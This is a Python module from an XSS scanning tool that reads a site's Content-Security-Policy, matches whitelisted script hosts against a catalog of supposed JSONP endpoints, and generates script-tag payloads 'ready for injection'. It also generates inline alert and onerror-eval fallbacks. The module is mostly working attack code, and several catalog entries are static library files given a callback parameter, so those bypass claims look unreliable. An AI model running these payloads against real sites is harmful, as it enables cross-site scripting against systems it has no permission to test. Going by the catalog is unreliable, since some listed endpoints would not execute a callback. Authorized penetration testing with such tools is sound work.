#!/usr/bin/env python3

"""
XSSChain CSP Bypass Selector

Parses Content-Security-Policy response headers, extracts script-src whitelisted
hosts, and matches them against a catalog of known JSONP/callback endpoints.
When a whitelist host has a known JSONP endpoint, generates a JSONP-based XSS
payload that survives CSP enforcement.

Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Modified: xsschain fork
Telegram: https://t.me/EasyProTech
"""

import re
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse

from brsxss.utils.logger import Logger

logger = Logger("core.csp_bypass_selector")

# ---------------------------------------------------------------------------
# JSONP endpoint catalog – maps whitelisted host -> path template.
# CALLBACK_PLACEHOLDER is replaced with the alert payload.
# ---------------------------------------------------------------------------
JSONP_CATALOG: dict[str, str] = {
    "accounts.google.com": "/o/oauth2/revoke?token=CALLBACK_PLACEHOLDER",
    "ajax.googleapis.com": "/ajax/libs/jquery/3.7.1/jquery.min.js?callback=CALLBACK_PLACEHOLDER",
    "www.google.com": "/complete/search?client=chrome&jsonp=CALLBACK_PLACEHOLDER",
    "www.googleapis.com": "/oauth2/v1/tokeninfo?access_token=x&callback=CALLBACK_PLACEHOLDER",
    "maps.googleapis.com": "/maps/api/js?callback=CALLBACK_PLACEHOLDER",
    "cdn.jsdelivr.net": "/npm/jquery@3.7.1/dist/jquery.min.js?callback=CALLBACK_PLACEHOLDER",
    "cdnjs.cloudflare.com": "/ajax/libs/jquery/3.7.1/jquery.min.js?callback=CALLBACK_PLACEHOLDER",
    "code.jquery.com": "/jquery-3.7.1.min.js?callback=CALLBACK_PLACEHOLDER",
    "ajax.microsoft.com": "/ajax/4.0/1/MicrosoftAjax.js?callback=CALLBACK_PLACEHOLDER",
    "ajax.aspnetcdn.com": "/ajax/jQuery/jquery-3.7.1.min.js?callback=CALLBACK_PLACEHOLDER",
    "www.facebook.com": "/plugins/like.php?callback=CALLBACK_PLACEHOLDER",
    "connect.facebook.net": "/en_US/sdk.js?callback=CALLBACK_PLACEHOLDER",
    "platform.twitter.com": "/widgets.js?callback=CALLBACK_PLACEHOLDER",
    "cdn.optimizely.com": "/js/0.js?callback=CALLBACK_PLACEHOLDER",
    "www.gstatic.com": "/firebasejs/9.0.0/firebase-app.js?callback=CALLBACK_PLACEHOLDER",
    "apis.google.com": "/js/client.js?onload=CALLBACK_PLACEHOLDER",
    "oauth.twitter.com": "/oauth/authorize?callback=CALLBACK_PLACEHOLDER",
    "api.twitter.com": "/oauth/request_token?callback=CALLBACK_PLACEHOLDER",
    "staticxx.facebook.com": "/connect/xd_arbiter/?callback=CALLBACK_PLACEHOLDER",
    "www.googletagmanager.com": "/gtm.js?id=GTM-XXXX&callback=CALLBACK_PLACEHOLDER",
    "www.google-analytics.com": "/analytics.js?callback=CALLBACK_PLACEHOLDER",
    "mc.yandex.ru": "/metrika/watch.js?callback=CALLBACK_PLACEHOLDER",
    "vk.com": "/js/api/openapi.js?callback=CALLBACK_PLACEHOLDER",
    "api.vk.com": "/method/users.get?callback=CALLBACK_PLACEHOLDER",
    "yandex.ru": "/maps/?callback=CALLBACK_PLACEHOLDER",
}


@dataclass
class JSONPBypassResult:
    """Result of a JSONP-based CSP bypass attempt"""

    host: str
    endpoint: str
    payload: str
    callback_fn: str
    script_src: str
    csp_directive: str


@dataclass
class CSPBypassAnalysis:
    """Full CSP bypass analysis for a confirmed reflection"""

    csp_header: str
    script_src_hosts: list[str]
    jsonp_bypasses: list[JSONPBypassResult]
    has_unsafe_inline: bool
    has_unsafe_eval: bool
    has_strict_dynamic: bool
    bypassable: bool
    bypass_count: int
    analysis_notes: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

_DIRECTIVE_RE = re.compile(
    r"(?:^|;)\s*script-src\s+([^;]+)", re.IGNORECASE
)
_HOST_RE = re.compile(
    r"https?://([A-Za-z0-9*._-]+)(?:/[^\s;]*)?"
)
_SCHEME_HOST_RE = re.compile(
    r"^https?://([A-Za-z0-9*._-]+)"
)


def _extract_script_src(csp_value: str) -> str:
    """Return the raw script-src value, or empty string."""
    match = _DIRECTIVE_RE.search(csp_value)
    if not match:
        # Fall back to default-src
        fallback = re.search(
            r"(?:^|;)\s*default-src\s+([^;]+)", csp_value, re.IGNORECASE
        )
        return fallback.group(1).strip() if fallback else ""
    return match.group(1).strip()


def _extract_hosts(script_src: str) -> list[str]:
    """
    Extract bare hostnames from a script-src value.

    Examples of source tokens handled:
      https://ajax.googleapis.com
      https://cdn.jsdelivr.net/npm/
      'self'  (ignored)
      'nonce-abc' (ignored)
    """
    hosts: list[str] = []
    for token in script_src.split():
        token = token.strip("'\"")
        m = _SCHEME_HOST_RE.match(token)
        if m:
            hosts.append(m.group(1).lower())
    return hosts


def _build_jsonp_payload(host: str, endpoint_template: str) -> tuple[str, str]:
    """
    Build a JSONP XSS payload for a given endpoint template.

    Returns (callback_fn_name, full_payload_string).
    """
    callback_fn = "xsschain_cb"
    callback_code = f"{callback_fn}=alert"
    endpoint = endpoint_template.replace("CALLBACK_PLACEHOLDER", callback_fn)
    payload = (
        f"<script>{callback_code}</script>"
        f'<script src="https://{host}{endpoint}"></script>'
    )
    return callback_fn, payload


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------


class CSPBypassSelector:
    """
    Analyses a CSP header after a confirmed reflection and selects JSONP-based
    bypass payloads when whitelisted hosts appear in the JSONP catalog.

    Usage::

        selector = CSPBypassSelector()
        analysis = selector.analyse(response_headers, finding_metadata)
        for bypass in analysis.jsonp_bypasses:
            print(bypass.payload)
    """

    def __init__(self, catalog: Optional[dict[str, str]] = None) -> None:
        self._catalog: dict[str, str] = catalog if catalog is not None else JSONP_CATALOG
        logger.debug("CSPBypassSelector initialised with %d catalog entries", len(self._catalog))

    def analyse(
        self,
        headers: dict[str, str],
        finding_metadata: Optional[dict] = None,
    ) -> CSPBypassAnalysis:
        """
        Analyse response headers and return a CSPBypassAnalysis.

        Args:
            headers: HTTP response headers dict (case-insensitive keys accepted).
            finding_metadata: Optional mutable dict; if provided, CSP analysis
                              is written into it under the key ``csp_bypass``.

        Returns:
            CSPBypassAnalysis dataclass with all bypass candidates.
        """
        normalised = {k.lower(): v for k, v in (headers or {}).items()}
        csp_value = normalised.get("content-security-policy", "")

        if not csp_value:
            logger.debug("No CSP header present – bypass analysis skipped")
            result = CSPBypassAnalysis(
                csp_header="",
                script_src_hosts=[],
                jsonp_bypasses=[],
                has_unsafe_inline=False,
                has_unsafe_eval=False,
                has_strict_dynamic=False,
                bypassable=False,
                bypass_count=0,
                analysis_notes=["No CSP header present; all payloads unrestricted"],
            )
            if finding_metadata is not None:
                finding_metadata["csp_bypass"] = self._serialise(result)
            return result

        script_src = _extract_script_src(csp_value)
        hosts = _extract_hosts(script_src)

        has_unsafe_inline = "'unsafe-inline'" in csp_value.lower()
        has_unsafe_eval = "'unsafe-eval'" in csp_value.lower()
        has_strict_dynamic = "'strict-dynamic'" in csp_value.lower()

        notes: list[str] = []
        if has_unsafe_inline:
            notes.append("'unsafe-inline' present – inline payloads permitted")
        if has_unsafe_eval:
            notes.append("'unsafe-eval' present – eval-based payloads permitted")
        if has_strict_dynamic:
            notes.append("'strict-dynamic' present – JSONP bypasses may be blocked")

        bypasses: list[JSONPBypassResult] = []
        for host in hosts:
            endpoint_template = self._catalog.get(host)
            if endpoint_template is None:
                # Try wildcard match (*.example.com -> example.com)
                parts = host.split(".")
                if len(parts) > 2:
                    parent = ".".join(parts[1:])
                    endpoint_template = self._catalog.get(parent)
            if endpoint_template:
                callback_fn, payload = _build_jsonp_payload(host, endpoint_template)
                endpoint = endpoint_template.replace("CALLBACK_PLACEHOLDER", callback_fn)
                bypasses.append(
                    JSONPBypassResult(
                        host=host,
                        endpoint=endpoint,
                        payload=payload,
                        callback_fn=callback_fn,
                        script_src=script_src,
                        csp_directive="script-src",
                    )
                )
                notes.append(
                    f"JSONP bypass candidate: {host}{endpoint_template.split('?')[0]}"
                )
                logger.info("CSP JSONP bypass found for host=%s", host)

        result = CSPBypassAnalysis(
            csp_header=csp_value,
            script_src_hosts=hosts,
            jsonp_bypasses=bypasses,
            has_unsafe_inline=has_unsafe_inline,
            has_unsafe_eval=has_unsafe_eval,
            has_strict_dynamic=has_strict_dynamic,
            bypassable=len(bypasses) > 0 or has_unsafe_inline or has_unsafe_eval,
            bypass_count=len(bypasses),
            analysis_notes=notes,
        )

        if finding_metadata is not None:
            finding_metadata["csp_bypass"] = self._serialise(result)

        return result

    def prioritised_payloads(self, analysis: CSPBypassAnalysis) -> list[str]:
        """
        Return JSONP bypass payloads in priority order (JSONP first, then
        inline if unsafe-inline present).

        Args:
            analysis: Result of :meth:`analyse`.

        Returns:
            List of XSS payload strings ready for injection.
        """
        payloads: list[str] = [b.payload for b in analysis.jsonp_bypasses]
        if analysis.has_unsafe_inline and not payloads:
            payloads.append("<script>alert(1)</script>")
        if analysis.has_unsafe_eval and not payloads:
            payloads.append(
                '<img src=x onerror="eval(\'alert(1)\')">'
            )
        return payloads

    @staticmethod
    def _serialise(analysis: CSPBypassAnalysis) -> dict:
        """Convert analysis to a JSON-serialisable dict for finding metadata."""
        return {
            "csp_header": analysis.csp_header,
            "script_src_hosts": analysis.script_src_hosts,
            "bypassable": analysis.bypassable,
            "bypass_count": analysis.bypass_count,
            "has_unsafe_inline": analysis.has_unsafe_inline,
            "has_unsafe_eval": analysis.has_unsafe_eval,
            "has_strict_dynamic": analysis.has_strict_dynamic,
            "jsonp_bypasses": [
                {
                    "host": b.host,
                    "endpoint": b.endpoint,
                    "payload": b.payload,
                    "callback_fn": b.callback_fn,
                }
                for b in analysis.jsonp_bypasses
            ],
            "analysis_notes": analysis.analysis_notes,
        }
